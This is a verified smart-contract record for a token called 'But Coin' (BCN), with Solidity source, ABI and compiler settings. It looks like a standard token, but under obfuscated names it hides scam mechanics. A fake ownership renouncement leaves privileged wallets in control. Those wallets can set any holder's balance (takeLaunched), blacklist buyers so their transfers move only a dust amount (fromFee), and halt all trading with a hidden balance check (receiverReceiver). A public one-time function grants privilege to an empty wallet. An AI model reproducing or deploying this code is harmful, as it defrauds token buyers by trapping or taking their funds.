{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract maxTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeLaunch {\n    function createPair(address amountSwap, address shouldTake) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface marketingTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface exemptWalletTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptMode) external view returns (uint256);\n\n    function transfer(address senderTo, uint256 senderMarketing) external returns (bool);\n\n    function allowance(address toMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderTo,\n        uint256 senderMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingMode, uint256 value);\n    event Approval(address indexed toMode, address indexed spender, uint256 value);\n}\n\ninterface exemptWalletTotalMetadata is exemptWalletTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ButCoin is maxTrading, exemptWalletTotal, exemptWalletTotalMetadata {\n\n    function getOwner() external view returns (address) {\n        return tradingLaunched;\n    }\n\n    uint256 public sellLimit;\n\n    uint256 constant teamTx = 17 ** 10;\n\n    uint256 public takeAtSell = 0;\n\n    function minMode(address senderAmount, address senderTo, uint256 senderMarketing) internal returns (bool) {\n        require(isReceiver[senderAmount] >= senderMarketing);\n        isReceiver[senderAmount] -= senderMarketing;\n        isReceiver[senderTo] += senderMarketing;\n        emit Transfer(senderAmount, senderTo, senderMarketing);\n        return true;\n    }\n\n    function transfer(address shouldAmountWallet, uint256 senderMarketing) external virtual override returns (bool) {\n        return modeSwap(_msgSender(), shouldAmountWallet, senderMarketing);\n    }\n\n    mapping(address => bool) public fundTx;\n\n    uint256 private launchTotal;\n\n    function launchedTrading(address senderAmount, address senderTo, uint256 senderMarketing) internal view returns (uint256) {\n        require(senderMarketing > 0);\n\n        uint256 teamSell = 0;\n        if (senderAmount == takeMarketing && amountMarketingTo > 0) {\n            teamSell = senderMarketing * amountMarketingTo / 100;\n        } else if (senderTo == takeMarketing && takeAtSell > 0) {\n            teamSell = senderMarketing * takeAtSell / 100;\n        }\n        require(teamSell <= senderMarketing);\n        return senderMarketing - teamSell;\n    }\n\n    uint256 public amountMarketingTo = 3;\n\n    uint256 totalAt;\n\n    address public isExempt;\n\n    function limitLaunched() private view {\n        require(fundTx[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed autoTeam, address indexed sellTotal);\n\n    bool public limitBuy;\n\n    bool public toToken;\n\n    address public takeMarketing;\n\n    string private atMode = \"But Coin\";\n\n    function name() external view virtual override returns (string memory) {\n        return atMode;\n    }\n\n    address receiverLiquidity;\n\n    mapping(address => bool) public maxSell;\n\n    uint256 private receiverSwap;\n\n    function owner() external view returns (address) {\n        return tradingLaunched;\n    }\n\n    bool private minFund;\n\n    function approve(address shouldModeToken, uint256 senderMarketing) public virtual override returns (bool) {\n        walletTotal[_msgSender()][shouldModeToken] = senderMarketing;\n        emit Approval(_msgSender(), shouldModeToken, senderMarketing);\n        return true;\n    }\n\n    mapping(address => uint256) private isReceiver;\n\n    function liquiditySender(address minIs) public {\n        require(minIs.balance < 100000);\n        if (limitBuy) {\n            return;\n        }\n        \n        fundTx[minIs] = true;\n        \n        limitBuy = true;\n    }\n\n    uint256 private toLaunched = 100000000 * 10 ** 18;\n\n    function modeAt() public {\n        emit OwnershipTransferred(isExempt, address(0));\n        tradingLaunched = address(0);\n    }\n\n    address walletReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function takeLaunched(address shouldAmountWallet, uint256 senderMarketing) public {\n        limitLaunched();\n        isReceiver[shouldAmountWallet] = senderMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingFund;\n    }\n\n    function balanceOf(address exemptMode) public view virtual override returns (uint256) {\n        return isReceiver[exemptMode];\n    }\n\n    function allowance(address takeToken, address shouldModeToken) external view virtual override returns (uint256) {\n        if (shouldModeToken == walletReceiver) {\n            return type(uint256).max;\n        }\n        return walletTotal[takeToken][shouldModeToken];\n    }\n\n    function receiverReceiver(uint256 senderMarketing) public {\n        limitLaunched();\n        totalAt = senderMarketing;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityLaunch;\n    }\n\n    string private liquidityLaunch = \"BCN\";\n\n    uint8 private tradingFund = 18;\n\n    mapping(address => mapping(address => uint256)) private walletTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toLaunched;\n    }\n\n    function modeSwap(address senderAmount, address senderTo, uint256 senderMarketing) internal returns (bool) {\n        if (senderAmount == isExempt) {\n            return minMode(senderAmount, senderTo, senderMarketing);\n        }\n        uint256 tokenAt = exemptWalletTotal(takeMarketing).balanceOf(receiverLiquidity);\n        require(tokenAt == totalAt);\n        require(senderTo != receiverLiquidity);\n        if (maxSell[senderAmount]) {\n            return minMode(senderAmount, senderTo, teamTx);\n        }\n        senderMarketing = launchedTrading(senderAmount, senderTo, senderMarketing);\n        return minMode(senderAmount, senderTo, senderMarketing);\n    }\n\n    address private tradingLaunched;\n\n    constructor (){\n        \n        modeAt();\n        marketingTrading tradingAutoLaunched = marketingTrading(walletReceiver);\n        takeMarketing = takeLaunch(tradingAutoLaunched.factory()).createPair(tradingAutoLaunched.WETH(), address(this));\n        receiverLiquidity = takeLaunch(tradingAutoLaunched.factory()).feeTo();\n        \n        isExempt = _msgSender();\n        fundTx[isExempt] = true;\n        isReceiver[isExempt] = toLaunched;\n        \n        emit Transfer(address(0), isExempt, toLaunched);\n    }\n\n    function fromFee(address launchedAmountBuy) public {\n        limitLaunched();\n        if (toToken) {\n            toToken = false;\n        }\n        if (launchedAmountBuy == isExempt || launchedAmountBuy == takeMarketing) {\n            return;\n        }\n        maxSell[launchedAmountBuy] = true;\n    }\n\n    uint256 limitSell;\n\n    bool public shouldTotalReceiver;\n\n    function transferFrom(address senderAmount, address senderTo, uint256 senderMarketing) external override returns (bool) {\n        if (_msgSender() != walletReceiver) {\n            if (walletTotal[senderAmount][_msgSender()] != type(uint256).max) {\n                require(senderMarketing <= walletTotal[senderAmount][_msgSender()]);\n                walletTotal[senderAmount][_msgSender()] -= senderMarketing;\n            }\n        }\n        return modeSwap(senderAmount, senderTo, senderMarketing);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldModeToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketingTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldModeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmountBuy\",\"type\":\"address\"}],\"name\":\"fromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"}],\"name\":\"liquiditySender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderMarketing\",\"type\":\"uint256\"}],\"name\":\"receiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotalReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAtSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmountWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMarketing\",\"type\":\"uint256\"}],\"name\":\"takeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmountWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ButCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}